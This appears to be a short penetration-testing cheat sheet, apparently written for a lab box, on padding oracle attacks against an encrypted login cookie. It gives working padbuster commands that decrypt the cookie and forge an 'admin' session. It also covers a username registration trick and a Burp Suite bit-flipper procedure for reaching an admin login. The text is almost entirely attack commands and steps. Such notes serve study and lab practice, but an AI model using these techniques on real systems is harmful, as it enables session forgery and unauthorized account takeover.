# Padding Oracle Attack

```http
GET /login.php HTTP1.1

auth: a4T7KNdBwkyF%2....F%2
```

### 1st Attack - Padbuster

```bash
padbuster http://<ip>/login.php <cookie> 8 -cookie "<auth>=<cookie>" -encoding 0
```

```bash
padbuster http://10.10.10.18/login.php a4T7KNdBwkyF%2....F%2 8 -cookie "auth=a4T7KNdBwkyF%2....F%2" -encoding 0
```

If you get "plain text: <credentials>" it's vulnerable

```bash
...
...
plain text: user=guest123
```
 
Attack admin cookie session
 
```bash
padbuster http://10.10.10.18/login.php a4T7KNdBwkyF%2....F%2 8 -cookie "auth=a4T7KNdBwkyF%2....F%2" -encoding 0 -plaintext "user=admin"
```
  
### 2nd Attack
  
Register
input=Username
input:Password
  
Username: admin= or Username: admin==
 
### 3th - Bit Flipper Attack

Create an account named bdmin

1. Burpsuite < Intruder < Positions

```http
GET /login.php HTTP1.1

auth: $a4T7KNdBwkyF%2....F%2$
```
2. Burpsuite Intruder < Payloads < Payload Type < Bit flipper
3. Grep Extract < Fetch Response = You are currently logged is as                                           
4. Start Attack
5. Search: You are currently logged is as admin
